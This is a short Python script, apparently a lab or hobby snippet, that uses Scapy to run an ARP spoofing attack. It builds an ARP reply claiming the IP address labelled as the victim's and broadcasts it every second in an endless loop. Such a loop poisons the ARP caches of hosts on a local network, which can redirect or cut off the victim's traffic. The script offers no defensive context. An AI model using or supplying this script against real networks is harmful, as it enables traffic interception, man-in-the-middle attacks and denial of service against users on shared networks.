## Import Scapy module
from scapy.all import *

packet = Ether()/ARP()
packet.op = 2 #replay
packet.psrc="10.12.166.77" #victim
sendp(packet, loop =1, inter = 1)

# packet.show()
